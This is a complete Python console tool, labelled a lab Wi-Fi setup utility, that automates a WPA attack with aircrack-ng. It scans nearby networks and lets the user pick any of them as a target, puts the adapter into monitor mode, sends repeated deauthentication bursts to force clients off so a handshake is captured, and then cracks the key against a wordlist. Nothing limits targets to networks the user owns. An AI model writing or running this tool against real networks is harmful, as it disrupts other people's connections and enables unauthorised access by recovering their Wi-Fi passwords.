#!/usr/bin/env python3
"""xfi — terminal console for lab Wi‑Fi test setup and aircrack-ng capture."""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

console = Console()

APP_NAME = "xfi"
TOOL_DIR = Path(__file__).resolve().parent
DEFAULT_HANDSHAKE_DIR = str(TOOL_DIR / "handshakes")
CAPTURE_TIMEOUT_SEC = 90
DEAUTH_COUNT = 5
DEAUTH_BURSTS = 8
DEAUTH_GAP_SEC = 8
AIRODUMP_WARMUP_SEC = 4


def effective_home() -> Path:
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user and os.geteuid() == 0:
        home = Path("/home") / sudo_user
        if home.is_dir():
            return home
    return Path.home()


CONFIG_DIR = effective_home() / ".config" / APP_NAME
CONFIG_FILE = CONFIG_DIR / "config.json"
COMMON_WORDLIST_DIRS = [
    Path("/usr/share/wordlists"),
    Path("/usr/share/seclists/Passwords"),
    effective_home() / "wordlists",
]


@dataclass
class Target:
    ssid: str = ""
    bssid: str = ""
    channel: str = ""
    signal: str = ""
    security: str = ""


@dataclass
class Settings:
    interface: str = ""
    wordlist: str = ""
    handshake_dir: str = DEFAULT_HANDSHAKE_DIR
    target: Target = field(default_factory=Target)


def load_settings() -> Settings:
    if not CONFIG_FILE.exists():
        return Settings()
    try:
        raw = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        target = Target(**raw.get("target", {}))
        return Settings(
            interface=raw.get("interface", ""),
            wordlist=raw.get("wordlist", ""),
            handshake_dir=raw.get("handshake_dir") or DEFAULT_HANDSHAKE_DIR,
            target=target,
        )
    except (OSError, json.JSONDecodeError, TypeError):
        return Settings()


def save_settings(settings: Settings) -> None:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    payload = {
        "interface": settings.interface,
        "wordlist": settings.wordlist,
        "handshake_dir": settings.handshake_dir or DEFAULT_HANDSHAKE_DIR,
        "target": asdict(settings.target),
    }
    CONFIG_FILE.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")


def pause(message: str = "Press Enter to go back...") -> None:
    Prompt.ask(f"[dim]{message}[/dim]", default="", show_default=False)


def warn_and_back(title: str, body: str) -> None:
    console.print()
    console.print(
        Panel(
            body,
            title=f"[bold red]Warning[/bold red] · {title}",
            border_style="red",
            box=box.ROUNDED,
        )
    )
    pause()


def wireless_interfaces() -> list[str]:
    ifaces: list[str] = []
    net = Path("/sys/class/net")
    if net.exists():
        for entry in sorted(net.iterdir()):
            if (entry / "wireless").exists() or (entry / "phy80211").exists():
                ifaces.append(entry.name)
    if ifaces:
        return ifaces

    iw = shutil.which("iw")
    if not iw:
        return []
    try:
        out = subprocess.check_output([iw, "dev"], text=True, stderr=subprocess.DEVNULL)
    except (OSError, subprocess.CalledProcessError):
        return []
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("Interface "):
            current = stripped.split(None, 1)[1]
            if current:
                ifaces.append(current)
    return ifaces


def iface_state(name: str) -> str:
    oper = Path(f"/sys/class/net/{name}/operstate")
    if oper.exists():
        try:
            return oper.read_text(encoding="utf-8").strip()
        except OSError:
            return "?"
    return "?"


def nmcli_split(line: str) -> list[str]:
    parts: list[str] = []
    buf: list[str] = []
    escaped = False
    for ch in line:
        if escaped:
            buf.append(ch)
            escaped = False
        elif ch == "\\":
            escaped = True
        elif ch == ":":
            parts.append("".join(buf))
            buf = []
        else:
            buf.append(ch)
    parts.append("".join(buf))
    return parts


def scan_networks(interface: str) -> tuple[list[dict[str, str]], Optional[str]]:
    nmcli = shutil.which("nmcli")
    if nmcli:
        cmd = [
            nmcli,
            "-g",
            "SSID,BSSID,CHAN,SIGNAL,SECURITY",
            "device",
            "wifi",
            "list",
            "ifname",
            interface,
            "--rescan",
            "yes",
        ]
        try:
            out = subprocess.check_output(cmd, text=True, stderr=subprocess.STDOUT)
            rows: list[dict[str, str]] = []
            seen: set[str] = set()
            for line in out.splitlines():
                if not line.strip():
                    continue
                parts = nmcli_split(line)
                if len(parts) < 5:
                    continue
                ssid, bssid, channel, signal, security = parts[:5]
                key = bssid.upper() or ssid
                if key in seen:
                    continue
                seen.add(key)
                rows.append(
                    {
                        "ssid": ssid or "<hidden>",
                        "bssid": bssid,
                        "channel": channel,
                        "signal": signal,
                        "security": security or "-",
                    }
                )
            rows.sort(key=lambda r: int(r["signal"] or "0"), reverse=True)
            return rows, None
        except subprocess.CalledProcessError as exc:
            err = (exc.output or str(exc)).strip()
            return [], err or "Scan failed (nmcli)"

    iw = shutil.which("iw")
    if not iw:
        return [], "No scan tool available (nmcli or iw)"
    try:
        out = subprocess.check_output(
            [iw, "dev", interface, "scan"],
            text=True,
            stderr=subprocess.STDOUT,
        )
    except subprocess.CalledProcessError as exc:
        err = (exc.output or str(exc)).strip()
        return [], err or "Scan failed (iw). You may need elevated privileges."

    rows = []
    current: dict[str, str] = {}
    for line in out.splitlines():
        s = line.strip()
        if s.startswith("BSS ") and s[4:21].count(":") == 5:
            if current.get("bssid"):
                rows.append(current)
            bssid = s[4:21].split()[0]
            current = {
                "ssid": "<hidden>",
                "bssid": bssid,
                "channel": "-",
                "signal": "0",
                "security": "-",
            }
        elif s.startswith("SSID:"):
            ssid = s.split("SSID:", 1)[1].strip()
            current["ssid"] = ssid or "<hidden>"
        elif s.startswith("signal:"):
            try:
                dbm = float(s.split()[1])
                current["signal"] = str(max(0, min(100, int(2 * (dbm + 100)))))
            except (IndexError, ValueError):
                pass
        elif "DS Parameter set: channel" in s:
            current["channel"] = s.rsplit(" ", 1)[-1]
    if current.get("bssid"):
        rows.append(current)
    rows.sort(key=lambda r: int(r["signal"] or "0"), reverse=True)
    return rows, None


def discover_wordlists(limit: int = 12) -> list[Path]:
    found: list[Path] = []
    for folder in COMMON_WORDLIST_DIRS:
        if not folder.is_dir():
            continue
        for path in sorted(folder.rglob("*")):
            if path.is_file() and path.stat().st_size > 0:
                found.append(path)
            if len(found) >= limit:
                return found
    return found


def wordlist_info(path: Path) -> str:
    try:
        size = path.stat().st_size
        if size < 1024:
            size_s = f"{size} B"
        elif size < 1024 * 1024:
            size_s = f"{size / 1024:.1f} KB"
        else:
            size_s = f"{size / (1024 * 1024):.1f} MB"
        lines = 0
        with path.open("rb") as fh:
            for lines, _ in enumerate(fh, 1):
                if lines >= 5_000_000:
                    return f"{size_s} · 5M+ lines"
        return f"{size_s} · {lines:,} lines"
    except OSError:
        return "Unable to read file"


def clear_screen() -> None:
    console.clear()


def render_banner(settings: Settings) -> None:
    title = Text()
    title.append("XFI", style="bold cyan")
    title.append("  ·  ", style="dim")
    title.append("Wireless lab setup console", style="white")

    iface = settings.interface or "[not set]"
    word = Path(settings.wordlist).name if settings.wordlist else "[not set]"
    target = settings.target.ssid or "[not set]"

    status = Table.grid(expand=True)
    status.add_column(justify="right")
    status.add_column(justify="left")
    status.add_row("[bold]Adapter[/bold]", f"[cyan]{iface}[/cyan]")
    status.add_row("[bold]Wordlist[/bold]", f"[cyan]{word}[/cyan]")
    status.add_row("[bold]Target[/bold]", f"[cyan]{target}[/cyan]")

    console.print(Panel(title, subtitle="Lab console — aircrack-ng capture + crack", border_style="cyan", box=box.DOUBLE))
    console.print(Panel(status, title="Current settings", border_style="blue", box=box.ROUNDED))


def render_menu() -> None:
    table = Table(show_header=False, box=box.SIMPLE, expand=True, padding=(0, 1))
    table.add_column("key", style="bold yellow", width=4)
    table.add_column("label")
    table.add_row("1", "Select a network adapter")
    table.add_row("2", "Discover networks and select a test target")
    table.add_row("3", "Select a password wordlist file")
    table.add_row("4", "Show current settings")
    table.add_row("5", "Start (uses saved settings)")
    table.add_row("0", "Exit")
    console.print(Panel(table, title="Main menu", border_style="green", box=box.ROUNDED))


def require_interface(settings: Settings) -> bool:
    if settings.interface:
        return True
    warn_and_back(
        "Network adapter required",
        "No network adapter is selected yet.\n"
        "Choose [bold]1 — Select a network adapter[/bold] from the menu,\n"
        "then try again.",
    )
    return False


def which_or_none(*names: str) -> Optional[str]:
    for name in names:
        path = shutil.which(name)
        if path:
            return path
    return None


def run_cmd(cmd: list[str], timeout: int = 60) -> tuple[int, str]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = ((proc.stdout or "") + (proc.stderr or "")).strip()
        return proc.returncode, out
    except FileNotFoundError:
        return 127, f"Command not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 1, f"Timed out after {timeout}s: {' '.join(cmd)}"


def require_root() -> bool:
    if os.geteuid() == 0:
        return True
    warn_and_back(
        "Root required",
        "Start needs root to run airmon-ng / airodump-ng / aireplay-ng.\n"
        "Re-run with: [bold]sudo ./xfi[/bold]",
    )
    return False


def require_ready(settings: Settings) -> bool:
    missing: list[str] = []
    if not settings.interface:
        missing.append("network adapter (menu 1)")
    if not settings.target.bssid:
        missing.append("test target BSSID (menu 2)")
    if not settings.target.channel or settings.target.channel in {"-", "?"}:
        missing.append("target channel (menu 2)")
    wordlist = Path(settings.wordlist) if settings.wordlist else None
    if not wordlist or not wordlist.is_file():
        missing.append("password wordlist file (menu 3)")
    if missing:
        warn_and_back(
            "Settings incomplete",
            "Set the following, then try Start again:\n\n"
            + "\n".join(f"• {item}" for item in missing),
        )
        return False
    return True


def safe_filename(ssid: str) -> str:
    cleaned = "".join(c if c.isalnum() or c in "-_." else "_" for c in ssid).strip("._")
    return (cleaned[:40] or "target")


def iface_type(name: str) -> str:
    iw = which_or_none("iw")
    if not iw:
        return ""
    code, out = run_cmd([iw, "dev", name, "info"], timeout=10)
    if code != 0:
        return ""
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.startswith("type "):
            return stripped.split(None, 1)[1]
    return ""


def list_monitor_ifaces() -> list[str]:
    return [name for name in wireless_interfaces() if iface_type(name) == "monitor"]


def enable_monitor(iface: str, channel: str) -> tuple[Optional[str], str]:
    if iface_type(iface) == "monitor":
        return iface, f"{iface} is already in monitor mode"

    airmon = which_or_none("airmon-ng")
    if not airmon:
        return None, "airmon-ng was not found on PATH"

    before = set(wireless_interfaces())
    run_cmd([airmon, "check", "kill"], timeout=90)

    start_cmd = [airmon, "start", iface]
    if channel.isdigit():
        start_cmd.append(channel)
    code, out = run_cmd(start_cmd, timeout=60)
    if code != 0:
        return None, out or f"airmon-ng start {iface} failed"

    after = set(wireless_interfaces())
    created = sorted(after - before)
    monitors = list_monitor_ifaces()

    match = re.search(r"\b(\w+mon)\b", out)
    candidates: list[str] = []
    if match:
        candidates.append(match.group(1))
    candidates.extend(created)
    candidates.extend(monitors)
    candidates.append(iface)
    for candidate in candidates:
        if candidate and iface_type(candidate) == "monitor":
            return candidate, out

    if monitors:
        return monitors[0], out
    if created:
        return created[0], out
    return None, out or (
        "Could not enable monitor mode. "
        "This adapter (often Realtek) may lack monitor/injection support."
    )


def stop_monitor(mon: Optional[str], _base_iface: str) -> None:
    airmon = which_or_none("airmon-ng")
    if airmon and mon:
        run_cmd([airmon, "stop", mon], timeout=40)
    systemctl = which_or_none("systemctl")
    if systemctl:
        run_cmd([systemctl, "restart", "NetworkManager"], timeout=40)


def start_airodump(
    mon: str, bssid: str, channel: str, prefix: Path
) -> tuple[Optional[subprocess.Popen], Optional[str]]:
    airodump = which_or_none("airodump-ng")
    if not airodump:
        return None, "airodump-ng was not found on PATH"
    log_path = prefix.with_suffix(".airodump.log")
    log_fh = log_path.open("w", encoding="utf-8")
    cmd = [
        airodump,
        "--bssid",
        bssid,
        "-c",
        channel,
        "-w",
        str(prefix),
        "--output-format",
        "pcap",
        mon,
    ]
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
        )
    except OSError as exc:
        log_fh.close()
        return None, str(exc)
    proc._xfi_log = log_fh  # type: ignore[attr-defined]
    return proc, None


def stop_airodump(proc: Optional[subprocess.Popen]) -> None:
    if proc is None:
        return
    log_fh = getattr(proc, "_xfi_log", None)
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
    if log_fh:
        try:
            log_fh.close()
        except OSError:
            pass


def run_deauth(mon: str, bssid: str, count: int = DEAUTH_COUNT) -> tuple[int, str]:
    aireplay = which_or_none("aireplay-ng")
    if not aireplay:
        return 127, "aireplay-ng was not found on PATH"
    return run_cmd(
        [aireplay, "--deauth", str(count), "-a", bssid, "-D", mon],
        timeout=30,
    )


def latest_cap(prefix: Path) -> Optional[Path]:
    caps = list(prefix.parent.glob(prefix.name + "-*.cap"))
    caps += list(prefix.parent.glob(prefix.name + "-*.pcap"))
    if not caps:
        return None
    caps.sort(key=lambda p: p.stat().st_mtime)
    return caps[-1]


def handshake_captured(capfile: Path, bssid: str) -> bool:
    if not capfile.exists() or capfile.stat().st_size < 24:
        return False

    cowpatty = which_or_none("cowpatty")
    if cowpatty:
        _code, out = run_cmd([cowpatty, "-c", "-r", str(capfile)], timeout=20)
        low = out.lower()
        if "incomplete" not in low and (
            "collected all necessary data" in low or "wpa handshake" in low
        ):
            return True

    aircrack = which_or_none("aircrack-ng")
    if aircrack:
        _code, out = run_cmd([aircrack, "-a2", "-b", bssid, str(capfile)], timeout=8)
        low = out.lower()
        if "no valid wpa handshakes" in low:
            return False
        if re.search(r"[1-9]\d*\s+handshake", low):
            return True
        if "handshake" in low and "0 handshake" not in low:
            return True
    return False


def crack_capture(capfile: Path, bssid: str, wordlist: str) -> tuple[Optional[str], str]:
    aircrack = which_or_none("aircrack-ng")
    if not aircrack:
        return None, "aircrack-ng was not found on PATH"

    cmd = [aircrack, "-a2", "-b", bssid, "-w", wordlist, str(capfile)]
    console.print(f"[dim]$ {' '.join(cmd)}[/dim]\n")
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except OSError as exc:
        return None, str(exc)

    collected: list[str] = []
    found: Optional[str] = None
    assert proc.stdout is not None
    for line in proc.stdout:
        text = line.rstrip("\n")
        collected.append(text)
        console.print(text)
        match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", text)
        if match:
            found = match.group(1)
    proc.wait()
    output = "\n".join(collected)
    if found:
        return found, output
    if proc.returncode != 0 and not output:
        return None, "aircrack-ng exited with an error"
    return None, output


def action_start(settings: Settings) -> None:
    if not require_root() or not require_ready(settings):
        return

    handshake_dir = Path(settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    try:
        handshake_dir.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        warn_and_back("Handshake folder", f"Could not create {handshake_dir}:\n{exc}")
        return

    clear_screen()
    render_banner(settings)
    summary = Table(box=box.ROUNDED, expand=True, show_header=False)
    summary.add_column("k", style="bold", width=16)
    summary.add_column("v")
    summary.add_row("Adapter", settings.interface)
    summary.add_row("Target", f"{settings.target.ssid}  ({settings.target.bssid})")
    summary.add_row("Channel", settings.target.channel)
    summary.add_row("Wordlist", settings.wordlist)
    summary.add_row("Handshake dir", str(handshake_dir))
    console.print(Panel(summary, title="Start", border_style="yellow"))
    console.print(
        "[yellow]Deauthentication will briefly disconnect clients on this access point "
        "so a WPA handshake can be captured.[/yellow]\n"
    )
    if not Confirm.ask("Continue?", default=False):
        return

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = handshake_dir / f"{safe_filename(settings.target.ssid)}_{stamp}"
    bssid = settings.target.bssid
    channel = settings.target.channel
    base_iface = settings.interface
    mon: Optional[str] = None
    dump_proc: Optional[subprocess.Popen] = None
    captured = False
    capfile: Optional[Path] = None
    restored = False

    try:
        console.print("\n[dim]Enabling monitor mode...[/dim]")
        mon, mon_out = enable_monitor(base_iface, channel)
        if not mon:
            warn_and_back(
                "Monitor mode failed",
                mon_out
                + "\n\nInternal Realtek adapters often lack monitor/injection support. "
                "A USB adapter with better aircrack-ng support may be required.",
            )
            return
        console.print(f"[green]Monitor interface:[/green] [bold]{mon}[/bold]")

        dump_proc, dump_err = start_airodump(mon, bssid, channel, prefix)
        if dump_err or dump_proc is None:
            warn_and_back("Capture failed", dump_err or "airodump-ng did not start")
            return

        console.print(
            f"[dim]Capturing to {prefix}-01.cap  (timeout {CAPTURE_TIMEOUT_SEC}s)[/dim]"
        )
        time.sleep(AIRODUMP_WARMUP_SEC)

        deadline = time.time() + CAPTURE_TIMEOUT_SEC
        burst = 0
        while time.time() < deadline:
            capfile = latest_cap(prefix)
            if capfile and handshake_captured(capfile, bssid):
                captured = True
                break

            burst += 1
            if burst <= DEAUTH_BURSTS:
                console.print(
                    f"[dim]Deauth burst {burst}/{DEAUTH_BURSTS} "
                    f"({DEAUTH_COUNT} frames) -> {bssid}[/dim]"
                )
                code, out = run_deauth(mon, bssid)
                if code != 0:
                    console.print(
                        f"[yellow]aireplay-ng warning:[/yellow] {out.splitlines()[-1] if out else code}"
                    )
            else:
                console.print("[dim]Waiting for handshake...[/dim]")

            slept = 0.0
            while slept < DEAUTH_GAP_SEC and time.time() < deadline:
                time.sleep(1)
                slept += 1
                capfile = latest_cap(prefix)
                if capfile and handshake_captured(capfile, bssid):
                    captured = True
                    break
            if captured:
                break

        stop_airodump(dump_proc)
        dump_proc = None
        capfile = capfile or latest_cap(prefix)

        console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
        stop_monitor(mon, base_iface)
        restored = True

        if not captured:
            extra = ""
            if capfile:
                extra = f"\nCapture file kept at:\n{capfile}"
            warn_and_back(
                "No handshake captured",
                "Timed out before a WPA handshake was seen.\n"
                "Injection may be unsupported on this adapter, or no client reconnected."
                + extra,
            )
            return

        console.print(f"\n[green]Handshake saved:[/green] [bold]{capfile}[/bold]\n")
        console.print("[dim]Running aircrack-ng against the wordlist...[/dim]\n")
        key, _out = crack_capture(capfile, bssid, settings.wordlist)
        console.print()
        if key:
            console.print(
                Panel(
                    f"KEY FOUND: [bold green]{key}[/bold green]\n\nCapture: {capfile}",
                    title="Result",
                    border_style="green",
                    box=box.ROUNDED,
                )
            )
        else:
            console.print(
                Panel(
                    "No key found in the selected wordlist.\n"
                    f"Handshake kept at:\n{capfile}",
                    title="Result",
                    border_style="yellow",
                    box=box.ROUNDED,
                )
            )
        pause()
    finally:
        stop_airodump(dump_proc)
        if not restored:
            console.print("[dim]Restoring adapter / NetworkManager...[/dim]")
            stop_monitor(mon, base_iface)


def action_select_interface(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    ifaces = wireless_interfaces()
    if not ifaces:
        warn_and_back(
            "No wireless adapter",
            "No wireless interface (wlan) was found.\n"
            "Make sure the adapter is enabled and not blocked by rfkill.",
        )
        return

    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("#", style="yellow", width=4)
    table.add_column("Interface", style="cyan")
    table.add_column("State")
    for i, name in enumerate(ifaces, 1):
        mark = "  <- current" if name == settings.interface else ""
        table.add_row(str(i), name + mark, iface_state(name))
    console.print(Panel(table, title="Wireless adapters", border_style="cyan"))

    choice = Prompt.ask("Adapter number (or Enter to go back)", default="")
    if not choice.strip():
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(ifaces)):
        warn_and_back("Invalid choice", "Enter a number from the list.")
        return

    settings.interface = ifaces[int(choice) - 1]
    save_settings(settings)
    console.print(f"\n[green]Adapter selected:[/green] [bold]{settings.interface}[/bold]")
    pause()


def action_select_wordlist(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    discovered = discover_wordlists()

    if discovered:
        table = Table(box=box.SIMPLE_HEAVY, expand=True)
        table.add_column("#", style="yellow", width=4)
        table.add_column("File", style="cyan")
        table.add_column("Details", style="dim")
        for i, path in enumerate(discovered, 1):
            mark = "  <- current" if str(path) == settings.wordlist else ""
            table.add_row(str(i), str(path) + mark, wordlist_info(path))
        console.print(Panel(table, title="Discovered wordlists", border_style="cyan"))
        console.print("[dim]Or type a full path to another file.[/dim]\n")

    raw = Prompt.ask("List number or file path (Enter to go back)", default="").strip()
    if not raw:
        return

    if raw.isdigit() and discovered and 1 <= int(raw) <= len(discovered):
        path = discovered[int(raw) - 1]
    else:
        path = Path(os.path.expanduser(raw)).resolve()

    if not path.is_file():
        warn_and_back("File not found", f"Invalid path or not a file:\n{path}")
        return

    settings.wordlist = str(path)
    save_settings(settings)
    console.print(f"\n[green]Wordlist selected:[/green] [bold]{path}[/bold]")
    console.print(f"[dim]{wordlist_info(path)}[/dim]")
    pause()


def action_discover_and_select_target(settings: Settings) -> None:
    if not require_interface(settings):
        return

    clear_screen()
    render_banner(settings)
    console.print("[dim]Scanning visible networks...[/dim]")
    rows, error = scan_networks(settings.interface)
    if error:
        warn_and_back("Scan failed", error)
        return
    if not rows:
        warn_and_back("No results", "No networks were found on the selected adapter.")
        return

    table = Table(box=box.SIMPLE_HEAVY, expand=True)
    table.add_column("#", style="yellow", width=4)
    table.add_column("SSID")
    table.add_column("BSSID", style="dim")
    table.add_column("CH", justify="right")
    table.add_column("Signal", justify="right")
    table.add_column("Security")
    for i, row in enumerate(rows, 1):
        mark = " <-" if row["bssid"] == settings.target.bssid and settings.target.bssid else ""
        table.add_row(
            str(i),
            row["ssid"] + mark,
            row["bssid"],
            row["channel"],
            row["signal"],
            row["security"],
        )
    console.print(Panel(table, title=f"Networks on {settings.interface}", border_style="green"))

    choice = Prompt.ask("Target number (Enter to go back)", default="")
    if not choice.strip():
        return
    if not choice.isdigit() or not (1 <= int(choice) <= len(rows)):
        warn_and_back("Invalid choice", "Enter a number from the network list.")
        return

    picked = rows[int(choice) - 1]
    settings.target = Target(
        ssid=picked["ssid"],
        bssid=picked["bssid"],
        channel=picked["channel"],
        signal=picked["signal"],
        security=picked["security"],
    )
    save_settings(settings)
    console.print(
        f"\n[green]Target selected:[/green] [bold]{settings.target.ssid}[/bold] "
        f"[dim]({settings.target.bssid})[/dim]"
    )
    pause()


def action_show_settings(settings: Settings) -> None:
    clear_screen()
    render_banner(settings)
    table = Table(box=box.ROUNDED, expand=True, show_header=False)
    table.add_column("k", style="bold", width=18)
    table.add_column("v")
    table.add_row("Adapter", settings.interface or "[red]not set[/red]")
    table.add_row("Wordlist", settings.wordlist or "[red]not set[/red]")
    if settings.wordlist:
        table.add_row("File details", wordlist_info(Path(settings.wordlist)))
    table.add_row("SSID", settings.target.ssid or "[red]not set[/red]")
    table.add_row("BSSID", settings.target.bssid or "-")
    table.add_row("Channel", settings.target.channel or "-")
    table.add_row("Security", settings.target.security or "-")
    table.add_row("Handshake dir", settings.handshake_dir or DEFAULT_HANDSHAKE_DIR)
    table.add_row("Config file", str(CONFIG_FILE))
    console.print(table)
    pause()


def main() -> int:
    settings = load_settings()
    while True:
        clear_screen()
        render_banner(settings)
        render_menu()
        choice = Prompt.ask("Choose a number", default="").strip()
        if choice == "1":
            action_select_interface(settings)
        elif choice == "2":
            action_discover_and_select_target(settings)
        elif choice == "3":
            action_select_wordlist(settings)
        elif choice == "4":
            action_show_settings(settings)
        elif choice == "5":
            action_start(settings)
        elif choice in {"0", "q", "Q", "exit"}:
            console.print("[dim]Goodbye.[/dim]")
            return 0
        else:
            warn_and_back("Unknown option", "Use 1, 2, 3, 4, 5, or 0 to exit.")


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        console.print("\n[dim]Cancelled.[/dim]")
        raise SystemExit(130)
